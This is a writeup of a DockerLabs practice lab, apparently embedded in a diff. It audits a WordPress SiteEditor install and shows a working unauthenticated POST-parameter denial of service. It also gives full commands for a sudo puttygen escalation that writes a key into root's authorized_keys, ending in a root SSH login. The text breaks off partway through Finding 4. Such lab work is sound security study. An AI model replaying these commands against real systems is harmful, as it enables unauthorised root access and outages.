@@ -1,0 +1,1071 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 112 Asucar &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Asucar</p><h1 id="112-asucar--writeup">112 Asucar — writeup</h1>
+<p><strong>Engagement date:</strong> 2026-09-30
+<strong>Image:</strong> <code>asucar:latest</code> (loaded from <code>labs/112/asucar.tar</code>, 889.5 MB)
+<strong>Container:</strong> <code>asucar_container</code> @ <code>[net-0-12]</code>
+<strong>Platform catalog description, verbatim</strong> (<code>tooling/download-labs.sh list</code>, row 112):</p>
+<blockquote>
+<p><code>112|Asucar|medio|Laboratorio para practicar la explotación de WordPress y escalada de privilegios abusando de puttygen mediante sudo.</code></p>
+</blockquote>
+<blockquote>
+<p><strong>Read this as a transcript, not a reproduction.</strong> This repo holds no lab
+artefacts, so a reader can check the quoted evidence and the reasoning but
+cannot re-run the target. Re-fetch the archive before disputing anything
+load-bearing here.</p>
+</blockquote>
+<hr />
+<h2 id="headline">Headline</h2>
+<p><strong>The manifest's platform label is right, and that is the least interesting
+thing about this lab.</strong></p>
+<ol>
+<li>The artefact really is WordPress — <strong>6.5.3</strong>, read from
+<code>wp-includes/version.php:19</code>, not from memory and not from the queue label.</li>
+<li>The lab's own intended chain <strong>cannot complete on the image as shipped.</strong>
+The single active plugin, SiteEditor, ships with <strong>two required PHP classes
+missing from the archive</strong>. The consequence is not a dead exploit, it is an
+<strong>unauthenticated denial of service against every POST endpoint in
+WordPress</strong>, and the icon-library file-write sink the lab is built around is
+unreachable in both directions.</li>
+<li>The <code>sudo puttygen</code> escalation the catalog names is <strong>real and I proved it</strong>,
+but I could only reach it from the operator side, because the entry condition
+(WordPress credentials) is not satisfiable on this image.</li>
+</ol>
+<p>Details and evidence below. Every negative carries a work count.</p>
+<hr />
+<h2 id="surface">Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- --min-rate 2000 [net-0-12]
+
+Nmap scan report for [net-0-12]
+Host is up (0.000045s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.59 ((Debian))
+Service Info: OS: Linux; CPE: cpe:/o/linux:linux_kernel
+</code></pre>
+<p>Versions taken from the artefact, not from the scanner:</p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Version</th>
+<th>Where the number is</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WordPress</td>
+<td><strong>6.5.3</strong></td>
+<td><code>wp-includes/version.php:19</code></td>
+</tr>
+<tr>
+<td>Apache</td>
+<td>2.4.59 (Debian)</td>
+<td><code>/usr/sbin/apache2 -v</code> → <code>Server version: Apache/2.4.59 (Debian)</code></td>
+</tr>
+<tr>
+<td>PHP</td>
+<td>8.2.18 (NTS), built Apr 11 2024</td>
+<td><code>php -v</code> → <code>PHP 8.2.18 (cli)</code></td>
+</tr>
+<tr>
+<td>OpenSSH</td>
+<td>OpenSSH_9.2, OpenSSL 3.0.11</td>
+<td><code>/usr/sbin/sshd -V</code> → <code>OpenSSH_9.2, OpenSSL 3.0.11 19 Sep 2023</code></td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Debian GNU/Linux 12 (bookworm)</td>
+<td><code>/etc/os-release</code> → <code>PRETTY_NAME=&quot;Debian GNU/Linux 12 (bookworm)&quot;</code></td>
+</tr>
+<tr>
+<td>SiteEditor plugin</td>
+<td><strong>1.1</strong></td>
+<td><code>wp-content/plugins/site-editor/site-editor.php:8</code> → <code>* Version: 1.1</code>; corroborated by <code>readme.txt</code> → <code>Stable tag: 1.1</code></td>
+</tr>
+<tr>
+<td>puttygen</td>
+<td>PuTTYgen 0.78</td>
+<td><code>/usr/bin/puttygen --help</code> → <code>Release 0.78</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="listening-sockets-measured-inside">Listening sockets, measured inside</h3>
+<pre><code>$ ss -tln                                    # 4 rows
+LISTEN 0  80   127.0.0.1:3306  0.0.0.0:*
+LISTEN 0  511  0.0.0.0:80      0.0.0.0:*
+LISTEN 0  128  0.0.0.0:22      0.0.0.0:*
+LISTEN 0  128     [::]:22         [::]:*
+</code></pre>
+<p><strong>UDP — a count-bearing negative, cross-checked by two tools that disagree
+about nothing:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Instrument</th>
+<th>Work count</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ss -lun | tail -n +2 | wc -l</code></td>
+<td>0 rows</td>
+<td>no UDP listener</td>
+</tr>
+<tr>
+<td><code>netstat -lun | tail -n +3 | wc -l</code></td>
+<td>0 rows</td>
+<td>no UDP listener</td>
+</tr>
+<tr>
+<td><code>tail -n +2 /proc/net/udp | wc -l</code></td>
+<td>0 data rows</td>
+<td>no UDP socket</td>
+</tr>
+<tr>
+<td><code>tail -n +2 /proc/net/udp6 | wc -l</code></td>
+<td>0 data rows</td>
+<td>no UDP socket</td>
+</tr>
+<tr>
+<td><code>docker image inspect asucar:latest --format '{{.Config.ExposedPorts}}'</code></td>
+<td><code>map[]</code></td>
+<td>no declared ports</td>
+</tr>
+</tbody>
+</table>
+<p><code>nmap -p-</code> is TCP by definition, so the four UDP instruments are the ones that
+carry the claim. Four independent reads, all zero: <strong>no UDP surface.</strong> This is
+a <em>measured</em> absence, not an untested one.</p>
+<p>MariaDB binds to <code>127.0.0.1:3306</code> only — unreachable from outside the host, so
+it is not an entry.</p>
+<h3 id="hidden-surfaces-found">Hidden surfaces found</h3>
+<p><strong><code>/var/www/html/wordpress/</code> is a decoy directory, and I measured it rather than
+naming it by resemblance.</strong> It is <em>empty</em>, and Apache indexes it because
+<code>asucar.conf</code> sets <code>Options Indexes</code>:</p>
+<pre><code>$ curl -s 'http://[net-0-12]/wordpress/'
+GET /wordpress/ : 200 bytes=746
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+...
+&lt;h1&gt;Index of /wordpress&lt;/h1&gt;
+
+$ curl -s 'http://[net-0-12]/wordpress/wp-includes/version.php'
+GET /wordpress/wp-includes/version.php : 404 bytes=273
+</code></pre>
+<p>Inside the docroot there is one directory literally named <code>wordpress</code>, and it is
+not a second installation — there is nothing in it. Filesystem count:
+<code>find /var/www/html/wordpress -type f | wc -l</code> → <strong>0 files</strong>. This is the
+opposite of the Joomla lab in this corpus, where the docroot <em>named</em>
+<code>wordpress</code> was the real install. Naming it by resemblance would have inverted
+the finding.</p>
+<p><strong>Virtual hosts, with a name that cannot exist as the control:</strong></p>
+<table>
+<thead>
+<tr>
+<th><code>Host:</code></th>
+<th>status</th>
+<th>bytes</th>
+<th>md5 of body</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>asucar.dl</code></td>
+<td>200</td>
+<td>96060</td>
+<td><code>b5bec52b71b29b435186f5563eafaf6c</code></td>
+</tr>
+<tr>
+<td><code>www.asucar.dl</code></td>
+<td>301</td>
+<td>0</td>
+<td><code>d41d8cd98f00b204e9800998ecf8427e</code></td>
+</tr>
+<tr>
+<td><code>[net-0-12]</code></td>
+<td>200</td>
+<td>96154</td>
+<td><code>fa36c1e8338d88027422aac7d0bb76b6</code></td>
+</tr>
+<tr>
+<td><code>nonexistent-host.invalid</code></td>
+<td>200</td>
+<td>96154</td>
+<td><code>fa36c1e8338d88027422aac7d0bb76b6</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>nonexistent-host.invalid</code> shares the hash of the IP-address request, so the
+IP-address body is the <strong>baseline</strong> (the <code>000-default</code> vhost). <code>asucar.dl</code>
+differs only in the siteurl-derived links and adds nothing. <strong>No hidden vhost.</strong></p>
+<h3 id="docroot-inventory-counts">Docroot inventory (counts)</h3>
+<pre><code>php files in docroot                                    : 1298
+plugin directories in wp-content/plugins                : 1  (site-editor)
+active_plugins option value                             : a:1:{i:0;s:27:&quot;site-editor/site-editor.php&quot;;}
+themes in wp-content/themes                             : 3  (twentytwentyfour, twentytwentythree, twentytwentytwo)
+</code></pre>
+<p>One plugin. One active plugin. That matters for the rest of this document.</p>
+<hr />
+<h2 id="the-class">The class</h2>
+<p><strong>Entry criterion:</strong> the plugin's own AJAX handlers — <em>does any of them run
+before an authorisation check?</em></p>
+<p><strong>Source that settled it,</strong> <code>wp-content/plugins/site-editor/editor/includes/site-editor-manager.class.php:1379-1396</code>:</p>
+<pre><code class="language-php">	function check_ajax_handler($ajax , $nonce , $capability = 'edit_theme_options'){
+
+		if ( is_admin() &amp;&amp; ! sed_doing_ajax() )
+			auth_redirect();
+		elseif ( sed_doing_ajax() &amp;&amp; ! is_user_logged_in() ){
+			$this-&gt;sed_die( 0 );
+		}
+
+		if ( ! current_user_can( $capability ) )
+			$this-&gt;sed_die( -1 );
+
+		if( !check_ajax_referer( $nonce . '_' . $this-&gt;get_stylesheet(), 'nonce' , false ) ){
+			$this-&gt;sed_die( -1 );
+		}
+		if( !isset($_POST['sed_page_ajax']) || $_POST['sed_page_ajax'] !=  $ajax){
+			$this-&gt;sed_die( -2 );
+		}
+	}
+</code></pre>
+<p><strong>Registration order beats handler presence.</strong> Every AJAX handler the plugin
+registers routes through this function first, and it demands (a) a logged-in
+session, (b) <code>edit_theme_options</code>, (c) a valid nonce. I enumerated every
+registered action to confirm no <code>wp_ajax_nopriv_*</code> exists:</p>
+<pre><code>$ grep -rhon &quot;wp_ajax_[a-zA-Z_0-9]*&quot; wp-content/plugins/site-editor --include=*.php | sort -u
+wp_ajax_add_zipped_font
+wp_ajax_customize_save
+wp_ajax_load_medias
+wp_ajax_load_modules
+wp_ajax_load_skins
+wp_ajax_remove_icons_font
+wp_ajax_sed_app_refresh_nonces
+wp_ajax_sed_create_preset
+wp_ajax_sed_deactivate_feedback
+wp_ajax_sed_delete_preset
+wp_ajax_sed_get_preset
+wp_ajax_sed_load_options
+wp_ajax_sed_module_presets
+wp_ajax_sed_save_preset
+wp_ajax_sed_save_presets
+wp_ajax_sed_upload_attachment
+</code></pre>
+<p><strong>16 actions, 0 of them <code>nopriv</code>.</strong> So the SiteEditor surface is
+authentication-gated by construction. The lab's WordPress-exploitation half
+therefore presupposes credentials — and that is exactly where this image stops.</p>
+<hr />
+<h2 id="chain">Chain</h2>
+<p>The intended graph, and what I could actually execute on each hop:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td><em>nothing unauthenticated</em></td>
+<td>—</td>
+<td>No unauthenticated path to code execution exists on this image. See Finding 1.</td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>www-data</code> (uid 33)</td>
+<td><strong>BLOCKED.</strong> RCE as <code>www-data</code> was not achieved. The plugin's sinks are unreachable; see Finding 1 and NOT-tested.</td>
+<td><code>uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(curiosito)</code> — measured <strong>as</strong> <code>www-data</code>, not asserted from <code>ps</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>curiosito</code> (uid 1000)</td>
+<td>Operator-side only: <code>setpriv --reuid=curiosito --regid=curiosito --init-groups</code>. <strong>Not an attack path</strong> — <code>curiosito</code>'s password is unknown and WordPress credentials were never obtained.</td>
+<td><code>uid=1000(curiosito) gid=1000(curiosito) groups=1000(curiosito)</code> and <code>/proc/self/status</code>: <code>Uid: 1000 1000 1000 1000</code> / <code>Gid: 1000 1000 1000 1000</code> / <code>Groups: 1000 </code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>root</code> (uid 0)</td>
+<td><code>sudo -n /usr/bin/puttygen [lab-home]/curiosito/lab112_key.pub -O public-openssh -o /root/.ssh/authorized_keys</code></td>
+<td><code>uid=0(root) gid=0(root) groups=0(root)</code>, <code>/proc/self/status</code>: <code>Uid: 0 0 0 0</code> / <code>Gid: 0 0 0 0</code> / <code>Groups: 0 </code>, measured inside an SSH session</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Hop 2→3 is real and proved. Hop 0→1 is not, and the writeup says so.</strong></p>
+<h3 id="the-privilege-escalation-with-a-manufactured-oracle">The privilege escalation, with a manufactured oracle</h3>
+<p>The vector has no output of its own — a successful <code>sudo puttygen</code> prints
+nothing. So I built the oracle before exploiting: a uniquely-marked keypair,
+comment <code>lab112-oracle-marker-2026-09-30-a41f</code>, whose presence in
+<code>/root/.ssh/authorized_keys</code> is a file only a root context can create.</p>
+<p>Oracle <strong>absent</strong> before:</p>
+<pre><code>$ ls -la /root/.ssh/
+total 8
+drwx------ 2 root root 4096 May 12  2024 .
+drwx------ 1 root root 4096 May 12  2024 ..
+authorized_keys exists? NO
+</code></pre>
+<p>The grant, read back from the running sudo configuration rather than from the
+file I had already read:</p>
+<pre><code>$ sudo -n -l          # as curiosito
+Matching Defaults entries for curiosito on fdf286c06d04:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User curiosito may run the following commands on fdf286c06d04:
+    (root) NOPASSWD: /usr/bin/puttygen
+</code></pre>
+<p>The exploit, run as <code>curiosito</code> (<code>CapEff: 0000000000000000</code>, <code>CapPrm: 0000000000000000</code> — no ambient capability doing the work):</p>
+<pre><code>$ setpriv --reuid=curiosito --regid=curiosito --init-groups /bin/bash -c '...'
+-rw-r--r-- 1 curiosito curiosito 418 Sep 30 09:17 [lab-home]/curiosito/lab112_key.pub
+  sudo -n /usr/bin/puttygen [lab-home]/curiosito/lab112_key.pub -O public-openssh -o /root/.ssh/authorized_keys
+  puttygen exit=0
+</code></pre>
+<p>Oracle <strong>present</strong> after — the file, its owner, and the marker:</p>
+<pre><code>$ stat -c '%a %U:%G %n' /root/.ssh/authorized_keys
+644 root:root /root/.ssh/authorized_keys
+$ grep -c lab112-oracle-marker /root/.ssh/authorized_keys
+1
+$ cat /root/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDArAr1dKtlujKcwNUe73ci7smLu1pthDuVfml0vA7ECSM5oMQil7bm1OCSG+pjbv9xl69CVH29Aup0Q0S+syqPmMmGMj8US1kMR3FLzwsolYg2MiTSF2/L5TypQ6XBfK8GbkkhImHk73PXxGTZmNC+3ilNBPTVW/f66dExHn+/B+DmAhxAGEOpJ/+oExCtb4X+8cDPQtCY4SufJ/JAlJLqqfZIOvrg2OiAdJNxRcTT3V2OOyAW1PpSn6L0XO40xrJMx2cR7hgVr7GOZ96Sn/gmut1N3L+dIXXokeDE1e6uB8RXOd/9bV/pagQbApd212guUvkh4h7UlbFaKEpvd1jJ lab112-oracle-marker-2026-09-30-a41f
+</code></pre>
+<p>And the chain closes — root over SSH, identity measured inside the new session,
+not inferred from who I asked:</p>
+<pre><code>$ ssh -i l112_oracle root@[net-0-12] 'id; grep -E &quot;^(Uid|Gid|Groups)&quot; /proc/self/status; whoami'
+uid=0(root) gid=0(root) groups=0(root)
+Uid:	0	0	0	0
+Gid:	0	0	0	0
+Groups:	0
+root
+</code></pre>
+<p>Note on the mechanism, measured rather than recalled: PuTTYgen 0.78 does <strong>not</strong>
+accept a bare public-key string as its keyfile argument. I tried it and it
+failed, which is the whole reason the input is a <em>file</em> <code>curiosito</code> owns:</p>
+<pre><code>$ sudo -n /usr/bin/puttygen &quot;ssh-rsa AAAAB3Nza... a41f&quot; -O save-as:/root/.ssh/authorized_keys
+puttygen: unknown output type `save-as:/root/.ssh/authorized_keys'
+puttygen exit=1
+
+$ sudo -n /usr/bin/puttygen &quot;ssh-rsa AAAAB3Nza... a41f&quot; -O public-openssh -o /root/.ssh/authorized_keys
+puttygen: unable to load file `ssh-rsa AAAAB3Nza... a41f': No such file or directory
+puttygen exit=1
+</code></pre>
+<p><code>-O save-as:</code> is not in this build's <code>-O</code> list
+(<code>/usr/bin/puttygen --help</code>: <code>private, private-openssh, private-openssh-new, private-sshcom, public, public-openssh, fingerprint, cert-info, text</code>). The
+working form is <code>-O public-openssh</code> plus <code>-o &lt;path&gt;</code>. If you file this finding
+from memory you will file the wrong mechanism.</p>
+<h3 id="this-repeats-an-existing-corpus-finding--extended-not-duplicated">This repeats an existing corpus finding — extended, not duplicated</h3>
+<p>Lab 12 (Collections) shipped the same plugin and reached the same place; its
+<code>INDEX.md</code> row records <em>&quot;el plugin está fatally incompleto: <code>dependency/</code> sólo
+contiene <code>index.html.tmp</code>, faltan las 2 clases que
+<code>site-editor-dependency-manager.class.php:42,46</code> requieren&quot;</em>. Same plugin
+(SiteEditor, <code>Stable tag: 1.1</code>), same WordPress core line (<code>6.5.3</code> from
+<code>version.php:19</code>), same two missing files.</p>
+<p>Per <code>PIPELINE.md</code> — <em>an existing rule that survived a fresh case is stronger
+than a new rule with one</em> — so this is <strong>an extension of lab 12's case, not a
+new class</strong>, and lab 12's row should be the one the methodology cites. What is
+new here and belongs to lab 112 alone:</p>
+<ul>
+<li>the <strong>remotely triggerable DoS</strong> framing, which lab 12 did not measure. Lab 12
+found 15 of 15 AJAX actions returning 500 from <em>inside</em> the plugin; nobody had
+shown that an unauthenticated client can <em>cause</em> it with one POST parameter
+on <em>any</em> endpoint.</li>
+<li>the <strong><code>sudo puttygen</code> escalation</strong> lab 12 could not have: lab 12's row says
+<code>sudo</code> was not installed and recorded &quot;sin escalada&quot;.</li>
+<li>the <strong><code>www-data</code> ∈ group <code>curiosito</code></strong> pivot, which is what would have completed
+lab 12's chain had a <code>www-data</code> RCE existed.</li>
+</ul>
+<hr />
+<h2 id="findings">Findings</h2>
+<h3 id="finding-1--critical-the-shipped-plugin-is-missing-two-required-classes-and-the-gap-is-remotely-triggerable-by-anyone-unauthenticated">Finding 1 — CRITICAL: the shipped plugin is missing two required classes, and the gap is remotely triggerable by anyone, unauthenticated</h3>
+<p><strong>CWE-755 (improper handling of exceptional conditions) / CWE-20 (improper
+input validation), presenting as CWE-400 (uncontrolled resource consumption) —
+and, at the root, an artefact defect: CWE-1104 (use of unmaintained third-party
+components) is <em>not</em> the right label here because the component is not merely
+old, it is incomplete.</strong></p>
+<p><strong>Literal evidence — the two required files, verbatim from
+<code>wp-content/plugins/site-editor/editor/extensions/options-engine/includes/site-editor-dependency-manager.class.php:42,46</code>:</strong></p>
+<pre><code class="language-php">        require_once dirname( __FILE__ ) . '/dependency/site-editor-options-dependency.class.php';
+...
+        require_once dirname( __FILE__ ) . '/dependency/site-editor-options-callback-dependency.class.php';
+</code></pre>
+<p><strong>What the shipped <code>dependency/</code> directory actually contains:</strong></p>
+<pre><code>$ cd /var/www/html/wp-content/plugins/site-editor
+$ for f in editor/extensions/options-engine/includes/dependency/site-editor-options-dependency.class.php \
+           editor/extensions/options-engine/includes/dependency/site-editor-options-callback-dependency.class.php; do
+      if [ -f &quot;$f&quot; ]; then echo &quot;PRESENT  $f&quot;; else echo &quot;MISSING  $f&quot;; fi
+  done
+MISSING  editor/extensions/options-engine/includes/dependency/site-editor-options-dependency.class.php
+MISSING  editor/extensions/options-engine/includes/dependency/site-editor-options-callback-dependency.class.php
+
+$ ls -A editor/extensions/options-engine/includes/dependency/ | wc -l
+1
+$ ls -A editor/extensions/options-engine/includes/dependency/
+index.html.tmp
+</code></pre>
+<p><strong>The trigger.</strong> <code>wp-content/plugins/site-editor/includes/functions.php:395-397</code>:</p>
+<pre><code class="language-php">function sed_doing_ajax(){
+    return isset( $_POST['sed_page_customized'] ) || ( defined( 'DOING_AJAX' ) &amp;&amp; DOING_AJAX &amp;&amp; isset( $_POST['sed_page_ajax'] ) );
+}
+</code></pre>
+<p>Two properties make this remotely triggerable by anyone:</p>
+<ol>
+<li><code>isset()</code> — <strong>the parameter's value is never read.</strong> An empty value fires it.</li>
+<li><code>sed_doing_ajax()</code> returning true is enough to make
+<code>site-editor.php:303-305</code> load the whole editor, which loads the extension
+loop at <code>site-editor-app.php:92</code>, which includes <code>options-engine.php</code>, whose
+constructor calls the missing file.</li>
+</ol>
+<p><strong>Measured, with controls on both sides:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Request</th>
+<th>Control (no plugin parameter)</th>
+<th>Treatment (<code>sed_page_customized</code>)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>POST /wp-login.php</code></td>
+<td><code>200</code>, <strong>7907 bytes</strong></td>
+<td><code>500</code>, <strong>2753 bytes</strong></td>
+</tr>
+<tr>
+<td><code>POST /</code></td>
+<td><code>200</code>, <strong>96154 bytes</strong></td>
+<td><code>500</code>, <strong>2628 bytes</strong></td>
+</tr>
+<tr>
+<td><code>POST /wp-admin/admin-ajax.php</code> (<code>action=heartbeat</code>)</td>
+<td>—</td>
+<td><code>500</code>, <strong>306 bytes</strong></td>
+</tr>
+<tr>
+<td><code>POST /wp-login.php</code> with <strong>empty</strong> value <code>sed_page_customized=</code></td>
+<td>—</td>
+<td><code>500</code>, <strong>2753 bytes</strong></td>
+</tr>
+<tr>
+<td><code>GET /?sed_page_customized=1</code></td>
+<td>—</td>
+<td><code>200</code>, <strong>96154 bytes</strong> (byte-identical to the plain <code>GET /</code>: not a POST parameter, so it does not fire)</td>
+</tr>
+</tbody>
+</table>
+<p>The server-side log names the cause without interpretation
+(<code>/var/log/apache2/error.log</code>):</p>
+<pre><code>[Wed Sep 30 09:05:29.321927 2026] [php:error] [pid 34] [client [net-0-1]:34744] PHP Fatal error:  Uncaught Error: Failed opening required '/var/www/html/wp-content/plugins/site-editor/editor/extensions/options-engine/includes/dependency/site-editor-options-dependency.class.php' (include_path='.:/usr/share/php') in /var/www/html/wp-content/plugins/site-editor/editor/extensions/options-engine/includes/site-editor-dependency-manager.class.php:42
+Stack trace:
+#0 /var/www/html/wp-content/plugins/site-editor/editor/extensions/options-engine/includes/site-editor-options-manager.class.php(108): SiteEditorOptionsDependencyManager-&gt;__construct()
+#1 /var/www/html/wp-content/plugins/site-editor/editor/extensions/options-engine/options-engine.php(39): SiteEditorOptionsManager-&gt;__construct()
+#2 /var/www/html/wp-content/plugins/site-editor/editor/extensions/options-engine/options-engine.php(96): SedOptionsEngineExtension-&gt;__construct()
+#3 /var/www/html/wp-content/plugins/site-editor/editor/site-editor-app.php(92): include_once('...')
+#4 /var/www/html/wp-content/plugins/site-editor/editor/site-editor-app.php(27): SiteEditorApp-&gt;includes()
+#5 /var/www/html/wp-content/plugins/site-editor/site-editor.php(329): SiteEditorApp-&gt;__construct()
+#6 /var/www/html/wp-content/plugins/site-editor/site-editor.php(304): SiteEditor-&gt;load_editor()
+#7 /var/www/html/wp-content/plugins/site-editor/site-editor.php(132): SiteEditor-&gt;includes()
+#8 /var/www/html/wp-content/plugins/site-editor/site-editor.php(93): SiteEditor-&gt;__construct()
+#9 /var/www/html/wp-content/plugins/site-editor/site-editor.php(416): SiteEditor::instance()
+#10 /var/www/html/wp-content/plugins/site-editor/site-editor.php(420): SED()
+#11 /var/www/html/wp-settings.php(517): include_once('...')
+#12 /var/www/html/wp-config.php(96): require_once('...')
+#13 /var/www/html/wp-load.php(50): require_once('...')
+#14 /var/www/html/wp-admin/admin-ajax.php(22): require_once('...')
+#15 {main}
+  thrown in /var/www/html/wp-content/plugins/site-editor/editor/extensions/options-engine/includes/site-editor-dependency-manager.class.php on line 42
+</code></pre>
+<p><strong>Impact.</strong> Any unauthenticated client can make WordPress return <code>500</code> on every
+POST endpoint, including the login form and the REST/ajax front door. There is
+no authentication, no nonce and no rate limit on the trigger. <strong>Impact on this
+lab specifically: the intended exploitation chain is unusable.</strong> See Finding 2.</p>
+<p><strong>Root cause.</strong> Two source files were not shipped inside the plugin archive.
+The <code>dependency/</code> directory contains exactly one entry, and it is
+<code>index.html.tmp</code>.</p>
+<p><strong>Fix.</strong> Ship the complete plugin, and add a build-time check that every
+<code>require_once</code> target in a distributed plugin resolves. Independently: treat
+<code>isset($_POST[...])</code> as an untrusted signal, and gate the editor load on an
+authenticated context before the extension loop runs.</p>
+<hr />
+<h3 id="finding-2--the-labs-own-intended-chain-is-unreachable-on-this-image-and-the-sink-it-is-built-around-cannot-be-reached-in-either-direction">Finding 2 — the lab's own intended chain is unreachable on this image, and the sink it is built around cannot be reached in either direction</h3>
+<p><strong>CWE-16 (configuration), lab-design observation.</strong></p>
+<p>The icon-library file-write sink — the classic SiteEditor exploitation — lives
+at <code>wp-content/plugins/site-editor/editor/extensions/icon-library/icon-library.php</code>,
+which registers:</p>
+<pre><code>icon-library.php:48:  add_action(&quot;wp_ajax_add_zipped_font&quot;, array($this,&quot;add_zipped_font&quot;) );
+icon-library.php:50:  add_action('wp_ajax_remove_icons_font', array( $this, 'remove_icons_font'));
+</code></pre>
+<p>and the write sink itself is at <code>icon-library.php:548</code>:</p>
+<pre><code class="language-php">  			fwrite( $handle, &quot;&lt;?php\r\necho '{$msg}';\r\n?&gt;&quot; );
+</code></pre>
+<p>Extensions load in <code>readdir()</code> order from <code>SED_EXT_PATH</code>, which
+<code>editor/includes/siteeditor.class.php:25</code> sets to <code>.../editor/extensions</code>, in
+the order the loop at <code>site-editor-app.php:88-93</code> walks:</p>
+<pre><code>$ ls -f .../editor/extensions/
+pagebuilder
+icon-library      &lt;-- the sink's module loads here
+media
+preset
+layout
+customize-posts
+static-module
+options-engine    &lt;-- dies here, per the fatal above
+design-editor
+</code></pre>
+<p>So the two states a request can be in:</p>
+<ul>
+<li><strong>No plugin parameter</strong> → the editor never loads → <code>wp_ajax_add_zipped_font</code>
+is never registered.</li>
+<li><strong>Any plugin parameter</strong> → the process fatals at <code>options-engine</code> before the
+request can do anything → <code>500</code>.</li>
+</ul>
+<p><strong>There is no third state in which the sink is both registered and usable.</strong> I
+executed both. I did <strong>not</strong> fabricate the two missing classes to find a fourth,
+so <em>whether the icon-library write would succeed on a correctly packaged build</em>
+is in <strong>NOT tested</strong> below, not asserted here.</p>
+<p>Two further reasons the sink is not reachable even before the packaging defect,
+both verified from the artefact rather than recalled:</p>
+<ol>
+<li>It is <code>wp_ajax_</code>, not <code>wp_ajax_nopriv_</code> → logged-in sessions only.</li>
+<li><code>check_ajax_handler()</code> additionally requires <code>edit_theme_options</code> <strong>and</strong> a
+valid nonce (<code>site-editor-manager.class.php:1387,1390</code>).</li>
+</ol>
+<p><strong>Impact.</strong> A reader of the catalog description would expect a WordPress
+exploitation → <code>sudo puttygen</code> chain. On this image the WordPress half cannot be
+executed. The <code>sudo puttygen</code> half is intact and is Finding 3.</p>
+<p><strong>Fix (lab side).</strong> Ship a complete SiteEditor build and pin its version to a
+release whose file set is verified; add a post-deploy smoke test that loads the
+admin AJAX bootstrap and asserts a <code>200</code>.</p>
+<hr />
+<h3 id="finding-3--high-unprivileged-sudo-grant-to-a-file-writing-binary-nopasswd-no-argument-restriction">Finding 3 — HIGH: unprivileged <code>sudo</code> grant to a file-writing binary, <code>NOPASSWD</code>, no argument restriction</h3>
+<p><strong>CWE-269 (improper privilege management) / CWE-250 (execution with unnecessary
+privileges).</strong></p>
+<p><strong>Literal evidence — <code>/etc/sudoers</code>, last line before <code>@includedir</code>:</strong></p>
+<pre><code>curiosito ALL=(root) NOPASSWD: /usr/bin/puttygen
+</code></pre>
+<p><strong>Root cause.</strong> <code>sudo(8)</code> has no way to restrict a binary's <em>behaviour</em>; a grant
+of <code>/usr/bin/puttygen</code> with no argument specification hands over its full write
+surface, and <code>-o &lt;path&gt;</code> lets the caller choose the path. <code>secure_path</code>
+(<code>Defaults secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</code>)
+constrains <em>which</em> binaries are found, not what this one can write.</p>
+<p><strong>Impact.</strong> Any code execution as <code>curiosito</code> — including a malicious
+<code>authorized_keys</code> write or a webshell — becomes <code>uid=0</code>. Proved end to end
+above with a manufactured oracle.</p>
+<p><strong>Nuance, measured:</strong> the grant has <strong>no wildcard</strong>, so the
+<code>sudo --help</code>-style argument-splitting bypass (<code># uid=-1</code>) does <strong>not</strong> apply
+here. Reporting this as that CVE would be a wrong mechanism. The real defect is
+simply that a write-capable binary was granted to an unprivileged user.</p>
+<p><strong>Fix.</strong> Drop the grant. If <code>puttygen</code> is genuinely needed, wrap it in a
+root-owned script that ignores caller-supplied paths, or grant the specific
+<code>-O fingerprint</code>-style read-only invocations the user actually needs.</p>
+<hr />
+<h3 id="finding-4--medium-www-data-is-a-member-of-the-curiosito-group-so-rce-as-the-web-user-reads-a-live-ssh-private-key">Finding 4 — MEDIUM: <code>www-data</code> is a member of the <code>curiosito</code> group, so RCE as the web user reads a live SSH private key</h3>
+<p><strong>CWE-732 (incorrect permission assignment for critical resource) /
+CWE-261 (weak encoding of cryptographic material — not the issue here; the issue
+is the trust boundary).</strong></p>
+<p><strong>Literal evidence — the group membership, quoted from the artefact:</strong></p>
+<pre><code>$ getent group curiosito
+curiosito:x:1000:www-data
+</code></pre>
+<p>Corroborated by the setup history the image shipped,
+<code>[lab-home]/curiosito/.bash_history</code> (readable as root; contents quoted):</p>
+<pre><code>sudo usermod -a -G curiosito www-data
+sudo chown curiosito:www-data [lab-home]/curiosito/.ssh/authorized_keys
+</code></pre>
